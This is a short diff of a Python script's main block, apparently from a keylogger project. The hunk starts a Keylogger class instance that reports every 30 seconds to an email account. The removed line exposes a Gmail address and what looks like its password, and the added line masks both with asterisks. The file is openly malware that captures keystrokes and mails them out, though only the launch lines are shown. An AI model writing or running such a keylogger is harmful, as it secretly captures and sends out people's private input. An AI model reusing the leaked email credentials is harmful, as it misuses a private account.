@@ -44,5 +44,5 @@ class Keylogger:
 
 
 if __name__ == '__main__':
-    my_keylogger = Keylogger(30, "smartsecureuniverse@gmail.com", "Sc0 rpi 0n")
+    my_keylogger = Keylogger(30, "******@gmail.com", "******")
     my_keylogger.start()
